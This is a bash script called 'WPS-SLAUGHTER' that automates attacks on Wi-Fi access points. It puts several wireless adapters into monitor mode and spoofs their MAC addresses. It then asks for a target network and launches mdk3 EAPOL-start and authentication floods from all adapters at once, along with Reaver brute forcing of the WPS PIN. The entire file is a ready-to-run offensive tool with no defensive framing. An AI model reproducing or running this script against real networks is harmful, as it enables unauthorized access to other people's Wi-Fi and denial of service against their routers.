#!/bin/bash
declare BSSID;
declare ESSID;
declare CHANNEL;
declare ADAPTER1;
declare ADAPTER2;
declare ADAPTER3;
declare ADAPTER4;
declare ADAPTER5;

echo "
██╗    ██╗██████╗ ███████╗      ███████╗██╗      █████╗ ██╗   ██╗ ██████╗ ██╗  ██╗████████╗███████╗██████╗ 
██║    ██║██╔══██╗██╔════╝      ██╔════╝██║     ██╔══██╗██║   ██║██╔════╝ ██║  ██║╚══██╔══╝██╔════╝██╔══██╗
██║ █╗ ██║██████╔╝███████╗█████╗███████╗██║     ███████║██║   ██║██║  ███╗███████║   ██║   █████╗  ██████╔╝
██║███╗██║██╔═══╝ ╚════██║╚════╝╚════██║██║     ██╔══██║██║   ██║██║   ██║██╔══██║   ██║   ██╔══╝  ██╔══██╗
╚███╔███╔╝██║     ███████║      ███████║███████╗██║  ██║╚██████╔╝╚██████╔╝██║  ██║   ██║   ███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝     ╚══════╝      ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

"

echo "WPS-SLAUGHTER BY: APATHETIC EUPHORIA"

sudo rfkill unblock all

echo "************** - How Many Wlan Adapters Would You Like To Use? - ************** 
1)1 Adapter
2)2 Adapters
3)3 Adapters
4)4 Adapters
5)5 Adapters"

read a
case $a in
	1)

echo 
read -p " - What is the name of your Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;

echo "------------------------------"
echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
echo "Monitor Mode Enabled"
echo "------------------------------"

echo "************** - Would you like to Change the Wlan Adapter's MAC Address? - ************** 
1)Yes
2)No"

read c
case $c in
	1)
echo "------------------------------"
echo "Setting the MAC Address"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
echo "MAC Changed"
echo "------------------------------"

;;
	2)
;;
	*)Invalid Option
;;
esac

gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"

echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;

echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;

echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
echo "-------------------------------------"


menu () {
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED"

read d
case $d in
	1)
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m
menu
;;
	3)
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	2)

echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;

echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;

echo "------------------------------"
echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
echo "Monitor Mode Enabled"
echo "------------------------------"

echo "************** - Would you like to set the 2 Adapters to an Identical MAC Address? - ************** 
1)Yes
2)No"

read f
case $f in
	1)
echo "------------------------------"
echo "Setting the MAC Address"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
echo "MAC Changed"
echo "------------------------------"
;;
	2)
;;
	*)Invalid Option
;;
esac



gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"

echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;

echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;

echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
echo "-------------------------------------"

menu () {
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED"

read g
case $g in
	1)
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m
menu
;;
	3)
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
menu
;;
	*)Invalid Option
menu
;;
esac

}

menu

;;
	3)

echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;

echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;

echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;

echo "------------------------------"
echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
sudo iwconfig $ADAPTER3 mode monitor
sleep 3
sudo ifconfig $ADAPTER3 up
echo "Monitor Mode Enabled"
echo "------------------------------"

echo "************** - Would you like to set the 3 Adapters to an Identical MAC Address? - ************** 
1)Yes
2)No"

read i
case $i in
	1)
echo "------------------------------"
echo "Setting the MAC Address"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER3 up
echo "MAC Changed"
echo "------------------------------"
;;
	2)
;;
	*)Invalid Option
;;
esac

gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"

echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;

echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;

echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
echo "-------------------------------------"

menu () {
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED"

read j
case $j in
	1)
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m
menu
;;
	3)
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	4)
echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;

echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;

echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;

echo 
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;

echo "------------------------------"
echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
sudo iwconfig $ADAPTER3 mode monitor
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
sudo iwconfig $ADAPTER4 mode monitor
sleep 3
sudo ifconfig $ADAPTER4 up
echo "Monitor Mode Enabled"
echo "------------------------------"

echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
1)Yes
2)No"

read l
case $l in
	1)
echo "------------------------------"
echo "Setting All Wlan MAC Addresses to Identical MAC"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER4 up
echo "MACs Changed"
echo "------------------------------"
;;
	2)
;;
	*)Invalid Option
;;
esac


gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"

echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;

echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;

echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
echo "-------------------------------------"

menu () {
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED"

read m
case $m in
	1)
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m
menu
;;
	3)
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;
	5)

echo 
read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;

echo 
read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;

echo 
read -p " - What is the name of your 3rd Wlan Adapter (Ex:Wlan2) - ": ADAPTER3;

echo 
read -p " - What is the name of your 4th Wlan Adapter (Ex:Wlan3) - ": ADAPTER4;

echo 
read -p " - What is the name of your 5th Wlan Adapter (Ex:Wlan4) - ": ADAPTER5;

echo "------------------------------"
echo "Enabling Monitor Mode"
sudo ifconfig $ADAPTER1 down
sleep 3
sudo iwconfig $ADAPTER1 mode monitor
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
sudo iwconfig $ADAPTER2 mode monitor
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
sudo iwconfig $ADAPTER3 mode monitor
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
sudo iwconfig $ADAPTER4 mode monitor
sleep 3
sudo ifconfig $ADAPTER4 up
sudo ifconfig $ADAPTER5 down
sleep 3
sudo iwconfig $ADAPTER5 mode monitor
sleep 3
sudo ifconfig $ADAPTER5 up
echo "Monitor Mode Enabled"
echo "------------------------------"

echo "************** - Would you like to set ALL Wlan Adapters to the same MAC Address? - ************** 
1)Yes
2)No"

read o
case $o in
	1)
echo "------------------------------"
echo "Setting All Wlan MAC Addresses to Identical MAC"
sudo ifconfig $ADAPTER1 down
sleep 3
macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER1 up
sudo ifconfig $ADAPTER2 down
sleep 3
macchanger $ADAPTER2 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER2 up
sudo ifconfig $ADAPTER3 down
sleep 3
macchanger $ADAPTER3 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER3 up
sudo ifconfig $ADAPTER4 down
sleep 3
macchanger $ADAPTER4 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER4 up
sudo ifconfig $ADAPTER5 down
sleep 3
macchanger $ADAPTER5 -m 02:22:88:29:EC:6F
sleep 3
sudo ifconfig $ADAPTER5 up
echo "MACs Changed"
echo "------------------------------"
;;
	2)
;;
	*)Invalid Option
;;
esac


gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"

echo 
read -p " - What is the BSSID(MAC) of the Target - ": BSSID;

echo 
read -p " - What is the ESSID(Ap Name) of the Target - ": ESSID;

echo 
read -p " - What is the CHANNEL # of the Target - ": CHANNEL;
echo "-------------------------------------"

menu () {
echo "************** - Which Attack Would You Like To Use? - ************** 
1)EAPOL Start Flood 
2)Authentication Flood
3)Reaver
4)Check if Access Point WPS is UNLOCKED"

read p
case $p in
	1)
timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
menu
;;
	2)
timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m
menu
;;
	3)
reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
menu
;;
	4)
gnome-terminal  --geometry=111x20 --title='Scanning for targets' -e "wash -i $ADAPTER1"
menu
;;
	*)Invalid Option
menu
;;
esac
}

menu

;;

esac
